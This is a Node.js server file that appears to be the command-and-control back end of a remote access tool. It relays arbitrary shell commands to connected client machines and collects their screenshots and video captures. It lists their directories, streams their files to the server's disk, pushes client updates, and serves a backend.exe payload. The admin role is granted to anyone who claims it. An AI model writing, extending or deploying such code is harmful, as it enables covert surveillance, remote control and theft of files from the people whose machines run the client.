// const io = require("socket.io")(7070);
const httpServer = require("http").createServer();
const io = require("socket.io")(httpServer, {
  cors: {
    // origin: "https://example.com",
    origin: "*",
    methods: ["GET", "POST"],
    credential: true,
  },
});
const ss = require("socket.io-stream");
const fs = require("fs");

class util {}
util.IdIndex = function (id) {
  for (let i = 0; i < clientArr.length; i++) {
    if (clientArr[i].id === id) {
      return i;
    }
  }
  return -1;
};

var clientArr = [];
var cmdResult = {
  data: "",
};

io.on("connection", (sk) => {
  sk.on("message", (data) => {
    if (data.admin === true) {
      console.log("i a admin");
      sk.join("admin");
    } else {
      console.log("i not admin");
      sk.join("client");
    }
    console.log(data);
  });
  sk.on("init", (information) => {
    let obj = {
      id: sk.id,
      streaming: false,
      ...information,
    };
    // console.log(obj);
    clientArr.push(obj);
  });

  sk.on("updateinfo", (newInfo) => {
    for (const obj of clientArr) {
      if (obj["id"] == sk.id) {
        for (const objKey in obj) {
          for (const key in newInfo) {
            if (Object.hasOwnProperty.call(obj, key)) {
              obj[key] = newInfo[key];
            }
          }
        }
      }
    }
  });

  sk.on("apidialog", (id) => {
    sk.to(id).emit("dialog");
  });

  sk.on("dialog", (dialogContent) => {
    sk.to("admin").emit("apidialog", dialogContent);
  });

  sk.on("cmdresult", (result) => {
    cmdResult.data = result;
    console.log(result);
    sk.to("admin").emit("apisendcmd", cmdResult);
  });
  sk.on("disconnect", (reason) => {
    console.log(reason);
    cmdResult.data = reason;
    // 删除数组中刚断开连接的元素
    if (util.IdIndex(sk.id) > -1) {
      clientArr.splice(util.IdIndex(sk.id), 1);
    }
  });

  sk.on("apigetallclients", () => {
    // console.log(clientArr)
    sk.emit("apigetallclients", clientArr);
  });

  sk.on("apisendcmd", (id, cmd) => {
    console.log(id, cmd);
    sk.to(id).emit("exec", cmd);
  });

  sk.on("apiupdateallclients", (update_name) => {
    sk.to("client").emit("version_update", update_name);
  });

  sk.on("apiupdatethisclient", (id, update_name) => {
    sk.to(id).emit("version_update", update_name);
  });

  sk.on("apiupdatethisclientcore", (id, update_name) => {
    sk.to(id).emit("version_update", update_name);
  });

  sk.on("apiupdatethisclientutils", (id, update_name) => {
    sk.to(id).emit("utils_update", update_name);
  });

  sk.on("apireload", () => {
    sk.to(sk.id).emit("reload");
  });

  sk.on("apigetscreenshot", (id) => {
    sk.to(id).emit("screenshot");
  });

  sk.on("screenshot", (imgBuffer) => {
    sk.to("admin").emit("apigetscreenshot", imgBuffer);
  });

  sk.on("debug", (msg) => {
    sk.to("admin").emit("debug", msg);
  });

  //FileExplorer
  sk.on("apilistdir", (id, dir) => {
    sk.to(id).emit("listdir", dir);
  });

  // sk.on("apidownloadfile", (id, fileName) => {
  //   sk.to(id).emit("downloadfile", fileName);
  //   // ss(sk).to(id).emit("downloadfile",)
  // });
  sk.on("apidownloadfile", (id, fileName) => {
    // ss(sk).to(id).emit("downloadfile", fileName);
    console.log(fileName);
    sk.to(id).emit("downloadfile", fileName);
  });

  ss(sk).on("downloadfile", (stream, fileName) => {
    // ss(sk).to("admin").emit("apidownloadfile", stream);
    // console.log(777);
    // console.log(stream);
    // if (!fs.existsSync("tmpDir")) {
    //   fs.mkdirSync("tmpDir");
    // }
    const to = fs.createWriteStream(`/Linux/var/www/tmpDir/${fileName}`);
    to.on("finish", () => {
      sk.to("admin").emit("apidownloadfile", fileName);
    });
    stream.pipe(to);
    // let stream2 = ss.createStream();
    // ss(sk).to("admin").emit("apidownloadfile", stream2);
    // stream.pipe(stream2);
  });

  sk.on("apishowfilecontent", (id, fileName) => {
    sk.to(id).emit("showfilecontent", fileName);
  });

  sk.on("listdir", (result, url) => {
    sk.to("admin").emit("apilistdir", result, url);
  });

  // sk.on("downloadfile", (fileContent) => {
  //   sk.to("admin").emit("apidownloadfile", fileContent);
  // });

  sk.on("showfilecontent", (result, url) => {
    sk.to("admin").emit("apishowfilecontent", result, url);
  });

  sk.on("apistartvideocapture", (id) => {
    sk.to(id).emit("startvideocapture");
    clientArr[util.IdIndex(id)].streaming = true;
  });

  sk.on("apistopvideocapture", (id) => {
    sk.to(id).emit("stopvideocapture");
    clientArr[util.IdIndex(id)].streaming = false;
  });

  // sk.on("startvideocapture", () => {});

  sk.emit("message", "hello from ser");
});

const koa = require("koa");
// const fs = require("fs");
let app = new koa();

app.use(async (ctx) => {
  let url = ctx.request.url;

  if (url === "/backend.exe") {
    console.log(url);
    ctx.body = fs.readFileSync("../client/backend.exe");
    // ctx.body = "hello";
  }
  if (url === "/hash.txt") {
    console.log(url);
    ctx.body = fs.readFileSync("../client/hash.txt");
  }
  if (url === "/pack.zip") {
    console.log(url);
    ctx.body = fs.readFileSync("../client/pack.zip");
  }
  if (url === "/backend.zip") {
    console.log(url);
    ctx.body = fs.readFileSync("../client/backend.zip");
  }
});

httpServer.listen(7070);

app.listen(7071);
